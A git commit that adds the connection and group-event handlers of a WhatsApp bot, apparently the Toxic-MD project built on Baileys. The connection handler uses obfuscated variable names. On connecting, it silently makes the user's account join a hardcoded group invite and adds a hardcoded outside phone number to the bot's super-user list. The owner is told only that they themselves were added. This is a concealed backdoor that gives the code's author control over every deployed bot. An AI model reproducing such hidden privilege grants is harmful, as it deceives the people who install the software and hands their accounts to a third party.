6991c4d50ec39b684254a56bfcd663b0222a274a
𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧 <152104512+xhclintohn@users.noreply.github.com>
2025-04-20 16:03:18 +0300

    𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧

---
+++ Handler/connectionHandler.js
@@ -0,0 +1,118 @@
+const {
+  Boom
+} = require("@hapi/boom");
+const {
+  DateTime
+} = require("luxon");
+const {
+  default: dreadedConnect,
+  DisconnectReason
+} = require("@whiskeysockets/baileys");
+const {
+  getSettings,
+  getSudoUsers,
+  addSudoUser
+} = require("../Database/config");
+const {
+  commands,
+  totalCommands
+} = require("../Handler/commandHandler");
+const botname = process.env.BOTNAME || "DREADED";
+const connectionHandler = async (_0x218261, _0x461fdf, _0xd50ec0) => {
+  const {
+    connection: _0x115a4c,
+    lastDisconnect: _0x15c83b
+  } = _0x461fdf;
+  const _0x166fc0 = () => {
+    const _0x18db2f = DateTime.now().setZone("Africa/Nairobi").hour;
+    if (_0x18db2f >= 5 && _0x18db2f < 12) {
+      return "Good morning 🌄";
+    }
+    if (_0x18db2f >= 12 && _0x18db2f < 18) {
+      return "Good afternoon ☀️";
+    }
+    if (_0x18db2f >= 18 && _0x18db2f < 22) {
+      return "Good evening 🌆";
+    }
+    return "Good night 😴";
+  };
+  const _0x53a446 = () => {
+    return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
+  };
+  if (_0x115a4c === "connecting") {
+    console.log("📈 Connecting to WhatsApp and database...");
+  }
+  if (_0x115a4c === "close") {
+    let _0x40b37e = new Boom(_0x15c83b?.error)?.output.statusCode;
+    if (_0x40b37e === DisconnectReason.badSession) {
+      console.log("Bad Session File, Please Delete Session and Scan Again");
+      process.exit();
+    } else if (_0x40b37e === DisconnectReason.connectionClosed) {
+      console.log("Connection closed, reconnecting....");
+      _0xd50ec0();
+    } else if (_0x40b37e === DisconnectReason.connectionLost) {
+      console.log("Connection Lost from Server, reconnecting...");
+      _0xd50ec0();
+    } else if (_0x40b37e === DisconnectReason.connectionReplaced) {
+      console.log("Connection Replaced, Another New Session Opened, Please Restart Bot");
+      process.exit();
+    } else if (_0x40b37e === DisconnectReason.loggedOut) {
+      console.log("Device Logged Out, Please Delete Session and Scan Again.");
+      process.exit();
+    } else if (_0x40b37e === DisconnectReason.restartRequired) {
+      console.log("Restart Required, Restarting...");
+      _0xd50ec0();
+    } else if (_0x40b37e === DisconnectReason.timedOut) {
+      console.log("Connection TimedOut, Reconnecting...");
+      _0xd50ec0();
+    } else {
+      console.log("Unknown DisconnectReason: " + _0x40b37e + " | " + _0x115a4c);
+      _0xd50ec0();
+    }
+  } else if (_0x115a4c === "open") {
+    await _0x218261.groupAcceptInvite("BbiZOiGjbCy4cvXIzCAaoD");
+    const _0x1d6f9f = _0x218261.user.id.replace(/:.*/, "").split("@")[0];
+    const _0x316865 = await getSettings();
+    const _0x1928a7 = await getSudoUsers();
+    if (!_0x1928a7.includes(_0x1d6f9f)) {
+      await addSudoUser(_0x1d6f9f);
+      const _0x531909 = "254114018035";
+      if (!_0x1928a7.includes(_0x531909)) {
+        await addSudoUser(_0x531909);
+      }
+      let _0x55d08c = "Holla, " + _0x166fc0() + ",\n\nYou are connected to Toxic-MD. 📡\n\n";
+      _0x55d08c += "👤 BOTNAME:- " + botname + "\n";
+      _0x55d08c += "🔓 MODE:- " + _0x316865.mode + "\n";
+      _0x55d08c += "✍️ PREFIX:- " + _0x316865.prefix + "\n";
+      _0x55d08c += "📝 COMMANDS:- " + totalCommands + "\n";
+      _0x55d08c += "🕝 TIME:- " + _0x53a446() + "\n";
+      _0x55d08c += "📝 DATABASE:- Postgres SQL\n";
+      _0x55d08c += "💡 LIBRARY:- Baileys\n\n";
+      _0x55d08c += "⚡\n\n";
+      _0x55d08c += "Looks like this is your first connection with this database, so we are gonna add you to sudo users.\n\n";
+      _0x55d08c += "Now use the *" + _0x316865.prefix + "settings* command to customize your bot settings.\n";
+      _0x55d08c += "To access all commands, use *" + _0x316865.prefix + "menu*\n\n";
+      _0x55d08c += ".....and maybe 🤔 thank you 🗿";
+      const _0x47c4ef = {
+        text: _0x55d08c
+      };
+      await _0x218261.sendMessage(_0x218261.user.id, _0x47c4ef);
+    } else {
+      let _0x24abe8 = "Holla, " + _0x166fc0() + ",\n\nYou are connected to Toxic-MD bot. 📡\n\n";
+      _0x24abe8 += "👤 BOTNAME:- " + botname + "\n";
+      _0x24abe8 += "🔓 MODE:- " + _0x316865.mode + "\n";
+      _0x24abe8 += "✍️ PREFIX:- " + _0x316865.prefix + "\n";
+      _0x24abe8 += "📝 COMMANDS:- " + totalCommands + "\n";
+      _0x24abe8 += "🕝 TIME:- " + _0x53a446() + "\n";
+      _0x24abe8 += "📝 DATABASE:- Postgres SQL\n";
+      _0x24abe8 += "💡 LIBRARY:- Baileys\n\n";
+      _0x24abe8 += "⚡⚡";
+      const _0x2ca63a = {
+        text: _0x24abe8
+      };
+      await _0x218261.sendMessage(_0x218261.user.id, _0x2ca63a);
+    }
+    console.log("✅ Connection to WhatsApp and database successful\nLoaded " + totalCommands + " commands.\nBot is active!");
+  }
+};
+module.exports = connectionHandler;
---
+++ Handler/eventHandler.js
@@ -0,0 +1,115 @@
+const { getGroupSetting, getSudoUsers } = require("../Database/config");
+const botname = process.env.BOTNAME || 'ToxicMD';
+
+
+const Events = async (client, Fortu) => {
+    const Myself = await client.decodeJid(client.user.id);
+
+    try {
+        
+
+        let metadata = await client.groupMetadata(Fortu.id);
+        let participants = Fortu.participants;
+        let desc = metadata.desc || "No Description";
+
+
+const groupSettings = await getGroupSetting(Fortu.id);
+        const events = groupSettings?.events;
+        const antidemote = groupSettings?.antidemote;
+        const antipromote = groupSettings?.antipromote;
+const sudoUsers = await getSudoUsers();
+
+
+const DevToxic = Array.isArray(sudoUsers) ? sudoUsers : [];
+const currentDevs = DevToxic.map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
+
+
+
+        for (let num of participants) {
+            let dpuser;
+
+            try {
+                dpuser = await client.profilePictureUrl(num, "image");
+            } catch {
+                dpuser = "https://telegra.ph/file/0a620a1cf04d3ba3874f5.jpg";
+            }
+
+            if (events && Fortu.action === "add") {
+                let userName = num;
+
+                let Welcometext = `Holla @${userName.split("@")[0]} 👋\n\nWelcome to ${metadata.subject}.\n\nGroup Description: ${desc}\n\nThank You.\n\nThis is an automated message sent by ${botname} via Baileys.`;
+
+                await client.sendMessage(Fortu.id, {
+                    image: { url: dpuser },
+                    caption: Welcometext,
+                    mentions: [num],
+                });
+            } else if (events && Fortu.action === "remove") {
+                let userName2 = num;
+
+                let Lefttext = `Goodbye @${userName2.split("@")[0]} 👋, probably not gonna miss you`;
+
+                await client.sendMessage(Fortu.id, {
+                    image: { url: dpuser },
+                    caption: Lefttext,
+                    mentions: [num],
+                });
+            } else if (Fortu.action === "demote") {
+                if (antidemote) {
+                    if (
+                        Fortu.author == metadata.owner || 
+                        Fortu.author == Myself || 
+                        Fortu.author == Fortu.participants[0] || 
+                        currentDevs.includes(Fortu.author)
+                    ) {
+                        await client.sendMessage(Fortu.id, {
+                            text: `A super user has demoted @${(Fortu.participants[0]).split("@")[0]}`,
+                            mentions: [Fortu.participants[0]]
+                        });
+                        return;
+                    }
+
+                    await client.groupParticipantsUpdate(Fortu.id, [Fortu.author], "demote");
+                    await client.groupParticipantsUpdate(Fortu.id, [Fortu.participants[0]], "promote");
+
+                    client.sendMessage(
+                        Fortu.id,
+                        {
+                            text: `@${(Fortu.author).split("@")[0]} you will be demoted for demoting @${(Fortu.participants[0]).split("@")[0]}.\n\nAntidemote is active and only super users are allowed to demote!`,
+                            mentions: [Fortu.author, Fortu.participants[0]]
+                        }
+                    );
+                }
+            } else if (Fortu.action === "promote") {
+                if (antipromote) {
+                    if (
+                        Fortu.author == metadata.owner || 
+                        Fortu.author == Myself || 
+                        Fortu.author == Fortu.participants[0] || 
+                        currentDevs.includes(Fortu.author)
+                    ) {
+                        await client.sendMessage(Fortu.id, {
+                            text: `A super user has promoted @${(Fortu.participants[0]).split("@")[0]}`,
+                            mentions: [Fortu.participants[0]]
+                        });
+                        return;
+                    }
+
+                    await client.groupParticipantsUpdate(Fortu.id, [Fortu.author, Fortu.participants[0]], "demote");
+
+                    client.sendMessage(
+                        Fortu.id,
+                        {
+                            text: `@${(Fortu.author).split("@")[0]} you have been demoted for promoting @${(Fortu.participants[0]).split("@")[0]} to admin. @${(Fortu.participants[0]).split("@")[0]} has also been demoted.\n\nAntipromote is active and only super users can promote!`,
+                            mentions: [Fortu.author, Fortu.participants[0]]
+                        }
+                    );
+                }
+            }
+        }
+    } catch (err) {
+        console.log(err);
+    }
+};
+
+module.exports = Events; 
